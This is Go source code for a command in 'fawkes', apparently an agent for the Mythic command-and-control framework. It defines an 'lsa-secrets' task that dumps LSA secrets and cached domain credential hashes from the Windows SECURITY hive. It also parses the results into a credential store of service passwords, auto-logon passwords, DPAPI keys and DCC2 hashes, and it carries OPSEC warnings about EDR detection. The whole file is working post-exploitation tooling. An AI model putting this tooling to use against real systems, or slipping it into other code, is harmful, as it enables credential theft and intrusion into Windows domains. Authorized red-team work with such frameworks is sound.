package agentfunctions

import (
	"fmt"
	"path/filepath"
	"strings"

	agentstructs "github.com/MythicMeta/MythicContainer/agent_structs"
	"github.com/MythicMeta/MythicContainer/mythicrpc"
)

func init() {
	agentstructs.AllPayloadData.Get("fawkes").AddCommand(agentstructs.Command{
		Name: "lsa-secrets",
		AssociatedBrowserScript: &agentstructs.BrowserScript{
			ScriptPath: filepath.Join(".", "fawkes", "browserscripts", "lsa_secrets_new.js"),
			Author:     "@galoryber",
		},
		Description:         "Extract LSA secrets (service passwords, DPAPI keys, machine account) and cached domain credentials (DCC2) from the SECURITY hive. Requires SYSTEM privileges.",
		HelpString:          "lsa-secrets -action <dump|cached>",
		Version:             1,
		Author:              "@galoryber",
		MitreAttackMappings: []string{"T1003.004", "T1003.005"}, // LSA Secrets, Cached Domain Credentials
		SupportedUIFeatures: []string{},
		CommandAttributes: agentstructs.CommandAttribute{
			SupportedOS: []string{agentstructs.SUPPORTED_OS_WINDOWS},
		},
		CommandParameters: []agentstructs.CommandParameter{
			{
				Name:          "action",
				CLIName:       "action",
				ParameterType: agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
				Choices:       []string{"dump", "cached"},
				DefaultValue:  "dump",
				Description:   "Action: dump (all LSA secrets) or cached (cached domain credentials only, DCC2 format)",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: true,
						UIModalPosition:     1,
						GroupName:           "Default",
					},
				},
			},
		},
		TaskFunctionParseArgString: func(args *agentstructs.PTTaskMessageArgsData, input string) error {
			if input == "" {
				return nil
			}
			return args.LoadArgsFromJSONString(input)
		},
		TaskFunctionParseArgDictionary: func(args *agentstructs.PTTaskMessageArgsData, input map[string]interface{}) error {
			return args.LoadArgsFromDictionary(input)
		},
		TaskFunctionOPSECPre: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTTaskOPSECPreTaskMessageResponse {
			action, _ := taskData.Args.GetStringArg("action")
			msg := "OPSEC WARNING: "
			switch action {
			case "cached":
				msg += "Extracting cached domain credentials (DCC2/MSCacheV2) from SECURITY hive. " +
					"Requires SYSTEM privileges. Reads HKLM\\SECURITY registry — may trigger EDR alerts."
			default:
				msg += "Extracting LSA secrets (service passwords, DPAPI keys, machine account) from SECURITY hive. " +
					"Requires SYSTEM privileges. Accesses HKLM\\SECURITY and HKLM\\SYSTEM — high detection risk."
			}
			return agentstructs.PTTTaskOPSECPreTaskMessageResponse{
				TaskID:             taskData.Task.ID,
				Success:            true,
				OpsecPreBlocked:    false,
				OpsecPreMessage:    msg,
				OpsecPreBypassRole: agentstructs.OPSEC_ROLE_OPERATOR,
			}
		},
		TaskFunctionOPSECPost: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTaskOPSECPostTaskMessageResponse {
			return agentstructs.PTTaskOPSECPostTaskMessageResponse{
				TaskID:              taskData.Task.ID,
				Success:             true,
				OpsecPostBlocked:    false,
				OpsecPostMessage:    "OPSEC AUDIT: LSA secrets extraction configured. Registry access to SECURITY hive will occur.",
				OpsecPostBypassRole: agentstructs.OPSEC_ROLE_OPERATOR,
			}
		},
		TaskFunctionProcessResponse: func(processResponse agentstructs.PtTaskProcessResponseMessage) agentstructs.PTTaskProcessResponseMessageResponse {
			response := agentstructs.PTTaskProcessResponseMessageResponse{
				TaskID:  processResponse.TaskData.Task.ID,
				Success: true,
			}
			responseText, ok := processResponse.Response.(string)
			if !ok || responseText == "" {
				return response
			}
			hostname := processResponse.TaskData.Callback.Host
			var creds []mythicrpc.MythicRPCCredentialCreateCredentialData

			// Detect cached domain credentials (DCC2 format)
			if strings.Contains(responseText, "Cached Domain Credentials") {
				lines := strings.Split(responseText, "\n")
				for i := 0; i < len(lines); i++ {
					trimmed := strings.TrimSpace(lines[i])
					// [+] DOMAIN\username
					if strings.HasPrefix(trimmed, "[+] ") && strings.Contains(trimmed, "\\") {
						identity := strings.TrimPrefix(trimmed, "[+] ")
						parts := strings.SplitN(identity, "\\", 2)
						domain := ""
						account := identity
						if len(parts) == 2 {
							domain = parts[0]
							account = parts[1]
						}
						// Next indented line is the hashcat hash
						if i+1 < len(lines) {
							hashLine := strings.TrimSpace(lines[i+1])
							if hashLine != "" {
								creds = append(creds, mythicrpc.MythicRPCCredentialCreateCredentialData{
									CredentialType: "hash",
									Realm:          domain,
									Account:        account,
									Credential:     hashLine,
									Comment:        "lsa-secrets (DCC2/MSCacheV2)",
								})
							}
						}
					}
				}
			}

			// Detect dump mode secrets
			if strings.Contains(responseText, "LSA Secrets") {
				lines := strings.Split(responseText, "\n")
				for i := 0; i < len(lines); i++ {
					trimmed := strings.TrimSpace(lines[i])
					// [+] _SC_servicename: or [+] DefaultPassword: or [+] DPAPI_SYSTEM:
					if !strings.HasPrefix(trimmed, "[+] ") {
						continue
					}
					nameAndColon := strings.TrimPrefix(trimmed, "[+] ")
					name := strings.TrimSuffix(nameAndColon, ":")
					if name == nameAndColon {
						continue
					}
					// Collect the value from subsequent indented lines
					var valueParts []string
					for j := i + 1; j < len(lines); j++ {
						nextLine := lines[j]
						if strings.HasPrefix(nextLine, "  ") || strings.HasPrefix(nextLine, "\t") {
							valueParts = append(valueParts, strings.TrimSpace(nextLine))
						} else {
							break
						}
					}
					value := strings.Join(valueParts, "\n")
					if value == "" {
						continue
					}
					if strings.HasPrefix(name, "_SC_") {
						creds = append(creds, mythicrpc.MythicRPCCredentialCreateCredentialData{
							CredentialType: "plaintext",
							Realm:          hostname,
							Account:        strings.TrimPrefix(name, "_SC_"),
							Credential:     value,
							Comment:        "lsa-secrets (service account)",
						})
					} else if name == "DefaultPassword" {
						creds = append(creds, mythicrpc.MythicRPCCredentialCreateCredentialData{
							CredentialType: "plaintext",
							Realm:          hostname,
							Account:        "DefaultPassword",
							Credential:     value,
							Comment:        "lsa-secrets (auto-logon)",
						})
					} else if name == "DPAPI_SYSTEM" {
						creds = append(creds, mythicrpc.MythicRPCCredentialCreateCredentialData{
							CredentialType: "key",
							Realm:          hostname,
							Account:        "DPAPI_SYSTEM",
							Credential:     value,
							Comment:        "lsa-secrets (DPAPI user:machine keys)",
						})
					}
				}
			}

			registerCredentials(processResponse.TaskData.Task.ID, creds)
			if len(creds) > 0 {
				logOperationEvent(processResponse.TaskData.Task.ID,
					fmt.Sprintf("[CREDENTIAL] lsa-secrets extracted %d secrets from %s", len(creds), processResponse.TaskData.Callback.Host), true)
			}
			return response
		},
		TaskFunctionCreateTasking: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTaskCreateTaskingMessageResponse {
			response := agentstructs.PTTaskCreateTaskingMessageResponse{
				Success: true,
				TaskID:  taskData.Task.ID,
			}
			action, _ := taskData.Args.GetStringArg("action")
			display := fmt.Sprintf("LSA secrets %s", action)
			response.DisplayParams = &display
			createArtifact(taskData.Task.ID, "API Call", fmt.Sprintf("LSA secret extraction via registry — %s", action))
			return response
		},
	})
}
